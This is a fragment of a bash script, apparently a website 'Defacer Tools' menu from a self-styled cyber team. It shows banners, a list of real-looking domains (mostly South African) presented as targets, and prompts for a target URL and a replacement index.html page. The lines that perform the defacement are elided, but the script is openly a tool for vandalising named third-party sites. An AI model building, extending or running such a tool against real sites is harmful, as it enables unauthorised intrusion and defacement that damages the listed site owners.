...
echo
echo
toilet -f future "    Defacer Tools ;v" | lolcat
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo $yellow
figlet -f future "DORAEMON CYBER TEAM" <br> "CRAZYQIM"
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo
...
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"Chemod@Qim404"$cyan" ~/Vacum"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
...
echo $red"http://tieronecapital.co.za"
echo $white "http://prorepafrica.com"
echo $red "http://xposurephotography.co.za"
echo $white "http://windmillsandporcupines.co.za"
echo $red "http://tcnig.co.za"
echo $white "http://techdirect.co.za"
echo $red "http://thehellenic.co.za"
echo $white "http://valdicare.co.za"
echo $red "http://uzingela.co.za"
echo $white "http://thefoundation.co.za"
echo $red "http://totemafrica.com"
echo $white "http://ziady.com"
echo $red "http://whadiz.com"
echo
echo $red "Eksekusi Taarget!!!"
echo $green "╭─"$blue"Chemod@Qim404"$cyan" ~/Vacum"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan Script!!! "
echo $green "╭─"$blue"Chemod@Qim404"$cyan" ~/Nama SC Harus(index.html)"$white
read -p " ╰─$ "  script
...
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"Qim404"$cyan" ~/Vacum"$white                               
read -p " ╰─$ " script
echo
echo
echo $white"Masukan Target1 !!!!"
echo $white "╭─"$green"Qim404"$cyan" ~/Crot"$white
read -p " ╰─$ " target1
